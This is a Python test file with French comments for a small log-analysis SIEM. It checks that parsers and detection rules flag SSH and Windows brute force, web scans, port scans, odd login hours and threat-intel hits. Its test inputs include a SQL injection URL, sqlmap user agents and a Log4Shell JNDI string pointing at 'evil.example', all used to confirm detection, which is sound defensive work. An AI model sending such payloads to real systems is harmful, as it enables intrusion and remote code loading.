"""Tests : chaque règle V1 doit se déclencher sur son scénario, et le
trafic normal ne doit produire aucune alerte (contrôle des faux positifs).
"""
import sys
from datetime import datetime, timedelta
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from minisiem.events import Event
from minisiem.parsers import (parse_auth_line, parse_apache_line, parse_ufw_line,
                              parse_line, parse_evtx_xml)
from minisiem.rules import load_rules, run_rules
from minisiem.geo import GeoResolver
from minisiem.config import Config, apply_config
from minisiem.export import rule_to_sigma, alerts_to_json
from minisiem.cti import ThreatIntel, enrich_alerts, detect_threat_contacts


def _win(ts, eid, user=None, ip=None, outcome="info", etype="win_logon"):
    return Event(timestamp=ts, source="windows", event_type=etype, outcome=outcome,
                 event_id=eid, user=user, source_ip=ip, raw="x")

RULES = load_rules(str(Path(__file__).resolve().parent.parent / "rules"))


def _ssh(ts, outcome, ip, user="admin"):
    return Event(timestamp=ts, source="auth.log", event_type="ssh_login",
                 outcome=outcome, source_ip=ip, user=user, raw="x")


def _ids(alerts):
    return {a.rule_id for a in alerts}


def test_parse_failed_password():
    ev = parse_auth_line(
        "Nov  8 13:37:01 web01 sshd[123]: Failed password for root "
        "from 203.0.113.66 port 50000 ssh2", year=2026)
    assert ev and ev.event_type == "ssh_login" and ev.outcome == "failure"
    assert ev.source_ip == "203.0.113.66" and ev.user == "root"


def test_parse_accepted_password():
    ev = parse_auth_line(
        "Nov  8 13:38:00 web01 sshd[9]: Accepted password for alice "
        "from 192.168.1.20 port 51000 ssh2", year=2026)
    assert ev and ev.outcome == "success" and ev.user == "alice"


def test_bruteforce_triggers():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0 + timedelta(seconds=5 * i), "failure", "203.0.113.66")
              for i in range(15)]
    assert "SSH_BRUTEFORCE" in _ids(run_rules(RULES, events))


def test_bruteforce_below_threshold_is_quiet():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0 + timedelta(seconds=5 * i), "failure", "203.0.113.66")
              for i in range(4)]
    assert "SSH_BRUTEFORCE" not in _ids(run_rules(RULES, events))


def test_bruteforce_success_sequence():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0 + timedelta(seconds=5 * i), "failure", "198.51.100.23")
              for i in range(6)]
    events.append(_ssh(t0 + timedelta(seconds=40), "success", "198.51.100.23"))
    assert "SSH_BRUTEFORCE_SUCCESS" in _ids(run_rules(RULES, events))


def test_sudo_privesc_match():
    ev = parse_auth_line(
        "Nov  8 11:00:00 web01 sudo[4812]:  www-data : user NOT in sudoers ; "
        "TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash", year=2026)
    assert ev and ev.event_type == "sudo" and ev.outcome == "failure"
    assert "SUDO_NOT_IN_SUDOERS" in _ids(run_rules(RULES, [ev]))


def test_normal_traffic_no_alert():
    t0 = datetime(2026, 11, 8, 9, 0, 0)
    events = []
    for i in range(20):
        events.append(_ssh(t0 + timedelta(minutes=2 * i), "success",
                            "192.168.1.20", user="alice"))
    assert run_rules(RULES, events) == []


# --- V2 : Apache, pare-feu, nouvelles règles, GeoIP ----------------------

def test_parse_apache_404():
    ev = parse_apache_line(
        '203.0.113.9 - - [08/Nov/2026:13:37:01 +0100] "GET /.env HTTP/1.1" '
        '404 512 "-" "sqlmap/1.7.2"')
    assert ev and ev.event_type == "web_request" and ev.status == 404
    assert ev.source_ip == "203.0.113.9" and "sqlmap" in ev.user_agent


def test_parse_ufw_block():
    ev = parse_ufw_line(
        "Nov  8 13:37:01 web01 kernel: [UFW BLOCK] IN=eth0 OUT= "
        "SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=50000 DPT=23")
    assert ev and ev.event_type == "fw_block" and ev.dest_port == 23
    assert ev.source_ip == "198.51.100.77"


def test_autodetect_routes_each_format():
    assert parse_line('10.0.0.5 - - [08/Nov/2026:10:00:00 +0100] '
                      '"GET / HTTP/1.1" 200 10 "-" "x"').event_type == "web_request"
    assert parse_line("Nov  8 10:00:00 web01 sshd[1]: Failed password for root "
                      "from 203.0.113.66 port 1 ssh2").event_type == "ssh_login"


def _web(ts, status, ip, ua="FF", url="/x"):
    return Event(timestamp=ts, source="access.log", event_type="web_request",
                 outcome="failure" if status >= 400 else "success",
                 source_ip=ip, status=status, user_agent=ua, url=url, raw="x")


def test_web_scan_triggers():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_web(t0 + timedelta(seconds=2 * i), 404, "203.0.113.9") for i in range(25)]
    assert "WEB_SCAN" in _ids(run_rules(RULES, events))


def test_web_tooling_user_agent():
    ev = _web(datetime(2026, 11, 8, 10, 0, 0), 404, "203.0.113.9", ua="sqlmap/1.7.2#dev")
    assert "WEB_ATTACK_TOOL" in _ids(run_rules(RULES, [ev]))


def test_web_injection_in_url():
    ev = _web(datetime(2026, 11, 8, 10, 0, 0), 500, "203.0.113.9",
              url="/p.php?id=1'%20UNION%20SELECT%20pass%20FROM%20users--")
    assert "WEB_INJECTION" in _ids(run_rules(RULES, [ev]))


def test_port_scan_distinct_ports():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [Event(timestamp=t0 + timedelta(seconds=i), source="ufw.log",
                    event_type="fw_block", outcome="blocked",
                    source_ip="198.51.100.77", dest_port=p, raw="x")
              for i, p in enumerate(range(1, 26))]
    assert "PORT_SCAN" in _ids(run_rules(RULES, events))


def test_port_scan_same_port_is_quiet():
    # 25 blocages mais vers le MÊME port : pas un scan, pas d'alerte
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [Event(timestamp=t0 + timedelta(seconds=i), source="ufw.log",
                    event_type="fw_block", outcome="blocked",
                    source_ip="198.51.100.77", dest_port=443, raw="x")
              for i in range(25)]
    assert "PORT_SCAN" not in _ids(run_rules(RULES, events))


def test_geo_skips_private_ip():
    r = GeoResolver()
    assert r.lookup("192.168.1.20") is None
    assert r.lookup(None) is None


# --- V3 : Windows EVTX, baseline horaire, ATT&CK -------------------------

_EVTX_4625 = (
    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
    '<System><EventID>4625</EventID>'
    '<TimeCreated SystemTime="2026-11-08T02:00:05Z"/><Computer>DC01</Computer>'
    '</System><EventData><Data Name="TargetUserName">administrateur</Data>'
    '<Data Name="IpAddress">203.0.113.66</Data>'
    '<Data Name="LogonType">10</Data></EventData></Event>')


def test_parse_evtx_4625():
    ev = parse_evtx_xml(_EVTX_4625)
    assert ev and ev.event_id == 4625 and ev.event_type == "win_logon"
    assert ev.outcome == "failure" and ev.source_ip == "203.0.113.66"
    assert ev.host == "DC01" and ev.user == "administrateur"


def test_parse_evtx_4732_group_add():
    xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
           '<System><EventID>4732</EventID>'
           '<TimeCreated SystemTime="2026-11-08T02:25:20Z"/><Computer>DC01</Computer>'
           '</System><EventData><Data Name="TargetUserName">Administrators</Data>'
           '<Data Name="MemberName">svc_backup</Data></EventData></Event>')
    ev = parse_evtx_xml(xml)
    assert ev.event_id == 4732 and ev.user == "svc_backup" and ev.detail == "Administrators"


def test_win_bruteforce_triggers():
    t0 = datetime(2026, 11, 8, 2, 0, 0)
    events = [_win(t0 + timedelta(seconds=5 * i), 4625, ip="203.0.113.66")
              for i in range(12)]
    assert "WIN_BRUTEFORCE" in _ids(run_rules(RULES, events))


def test_win_bruteforce_success_sequence():
    t0 = datetime(2026, 11, 8, 2, 0, 0)
    events = [_win(t0 + timedelta(seconds=6 * i), 4625, ip="198.51.100.23")
              for i in range(6)]
    events.append(_win(t0 + timedelta(seconds=50), 4624, ip="198.51.100.23", outcome="success"))
    assert "WIN_BRUTEFORCE_SUCCESS" in _ids(run_rules(RULES, events))


def test_win_log_cleared_match():
    ev = _win(datetime(2026, 11, 8, 2, 40), 1102, etype="win_log_cleared")
    assert "WIN_LOG_CLEARED" in _ids(run_rules(RULES, [ev]))


def test_unusual_hour_flags_outlier():
    # jdupont se connecte 8x en journée + 1x à 3h : seule la connexion de nuit sort
    events = []
    for hour in (8, 9, 10, 11):
        for k in range(2):
            events.append(_win(datetime(2026, 11, 8, hour, 10 * k), 4624,
                               user="jdupont", outcome="success"))
    events.append(_win(datetime(2026, 11, 8, 3, 12), 4624,
                       user="jdupont", outcome="success"))
    alerts = [a for a in run_rules(RULES, events) if a.rule_id == "WIN_UNUSUAL_HOUR"]
    assert len(alerts) == 1 and alerts[0].count == 1
    assert alerts[0].first_seen.hour == 3


def test_consistent_hours_no_alert():
    # Un compte de service qui tourne toujours à 2h n'est pas une anomalie
    events = [_win(datetime(2026, 11, 8, 2, 5 * i), 4624, user="svc", outcome="success")
              for i in range(6)]
    assert not [a for a in run_rules(RULES, events) if a.rule_id == "WIN_UNUSUAL_HOUR"]


# --- V4 : listes blanches, exports, Log4Shell ----------------------------

def _web(ts, status, ip, ua="FF", url="/x"):
    return Event(timestamp=ts, source="access.log", event_type="web_request",
                 outcome="failure" if status >= 400 else "success",
                 source_ip=ip, status=status, user_agent=ua, url=url, raw="x")


def test_log4shell_detected():
    ev = _web(datetime(2026, 11, 8, 10, 0, 0), 200, "203.0.113.9",
              url="/search?q=${jndi:ldap://evil.example/a}")
    assert "WEB_LOG4SHELL" in _ids(run_rules(RULES, [ev]))


def test_allowlist_suppresses_by_cidr():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0 + timedelta(seconds=5 * i), "failure", "10.1.2.3") for i in range(15)]
    alerts = run_rules(RULES, events)
    assert "SSH_BRUTEFORCE" in _ids(alerts)
    cfg = Config(allow_nets=[__import__("ipaddress").ip_network("10.0.0.0/8")])
    assert apply_config(alerts, cfg) == []


def test_disabled_rule_suppressed():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0 + timedelta(seconds=5 * i), "failure", "203.0.113.66") for i in range(15)]
    alerts = run_rules(RULES, events)
    cfg = Config(disabled_rules={"SSH_BRUTEFORCE"})
    assert apply_config(alerts, cfg) == []


def test_sigma_export_is_valid_yaml():
    import yaml as _yaml
    rule = next(r for r in RULES if r["id"] == "SSH_BRUTEFORCE")
    doc = _yaml.safe_load(rule_to_sigma(rule))
    assert doc["id"] == "SSH_BRUTEFORCE" and "detection" in doc and "logsource" in doc


def test_json_export_roundtrips():
    import json as _json
    ev = _web(datetime(2026, 11, 8, 10, 0, 0), 200, "203.0.113.9",
              url="/x?q=${jndi:ldap://e/a}")
    data = _json.loads(alerts_to_json(run_rules(RULES, [ev])))
    assert data and data[0]["rule_id"] == "WEB_LOG4SHELL"


# --- V5 : CTI (renseignement sur les menaces) ----------------------------

def test_cti_feed_loads():
    ti = ThreatIntel()
    assert ti.size > 0 and ti.match_ip("198.51.100.23") is not None


def test_cti_enriches_matching_alert():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0 + timedelta(seconds=5 * i), "failure", "203.0.113.66")
              for i in range(15)]
    alerts = run_rules(RULES, events)
    ti = ThreatIntel()
    assert enrich_alerts(alerts, ti) >= 1
    bf = next(a for a in alerts if a.rule_id == "SSH_BRUTEFORCE")
    assert bf.threat and bf.threat["category"] == "bruteforce"


def test_cti_detects_known_bad_below_threshold():
    # 3 échecs seulement depuis une IP C2 connue : aucune règle de volume,
    # mais la CTI doit la signaler.
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0 + timedelta(seconds=30 * i), "failure", "203.0.113.200")
              for i in range(3)]
    rule_alerts = run_rules(RULES, events)
    assert "SSH_BRUTEFORCE" not in _ids(rule_alerts)
    ti = ThreatIntel()
    cti_alerts = detect_threat_contacts(ti, events, rule_alerts)
    assert len(cti_alerts) == 1 and cti_alerts[0].rule_id == "THREAT_INTEL_HIT"
    assert cti_alerts[0].severity == "critical"  # confiance 92, catégorie c2


def test_cti_no_contact_for_clean_ip():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0, "failure", "192.0.2.1")]  # IP absente du flux
    ti = ThreatIntel()
    assert detect_threat_contacts(ti, events, []) == []
